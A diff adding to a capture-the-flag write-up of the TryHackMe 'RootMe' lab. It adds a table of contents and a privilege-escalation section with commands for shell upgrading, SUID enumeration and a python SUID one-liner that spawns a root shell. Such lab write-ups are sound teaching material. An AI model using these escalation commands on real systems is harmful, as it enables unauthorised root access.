@@ -4,6 +4,10 @@
 
 *"A ctf for beginners, can you root me?"* -[ReddyyZ](https://tryhackme.com/p/ReddyyZ)
 
+1. [Scan/Enumeration](#Scan/Enumeration)
+2. [Gain Shell](#GainShell)
+3. [Privilege Escalation](#PrivilegeEscalation)
+
 ******
 
 ## [Scan/Enumeration]
@@ -47,3 +51,23 @@ Yes it worked. Let's download [php_reverse_shell](https://github.com/pentestmonk
 
 ## [Privilege Escalation]
 
+First of all, let's make shell more useful.
+
+`export TERM=xterm`
+`python -c 'import pty; pty.spawn("/bin/bash")'`
+
+![rootme-9](.Images/rootme-9.png)
+
+Now we can find the SUID files.
+
+`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null | grep /bin`
+
+![rootme-10](.Images/rootme-10.png)
+
+We found /usr/bin/python in SUID files. Let's take a look at [GTFOBins](https://gtfobins.github.io/gtfobins/python/). We can use SUID section.
+
+`/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+
+![rootme-11](.Images/rootme-11.png)
+
+And now we are root user.
